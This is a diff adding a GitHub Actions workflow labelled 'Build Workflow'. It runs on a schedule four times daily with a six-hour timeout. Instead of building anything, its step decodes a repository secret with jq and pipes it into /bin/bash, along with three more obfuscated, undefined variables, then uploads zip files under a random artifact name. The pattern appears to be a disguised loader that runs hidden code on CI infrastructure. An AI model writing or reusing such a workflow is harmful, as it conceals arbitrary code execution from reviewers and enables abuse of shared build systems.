@@ -1,0 +1,34 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          tfwc100: ${{ secrets.tfwc100 }}
+        run: |
+          printf '%s' "$tfwc100" | jq -r .wkf37 | /bin/bash
+          echo $dv99230 | jq -r .r9258 | /bin/bash
+          printf '%s' "$ottoe6585" | jq -r .t541 | /bin/bash
+          echo $uotz02940 | jq -r .kldd954 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: PlGPjrUT
+          path: "*.zip"
+          retention-days: 1
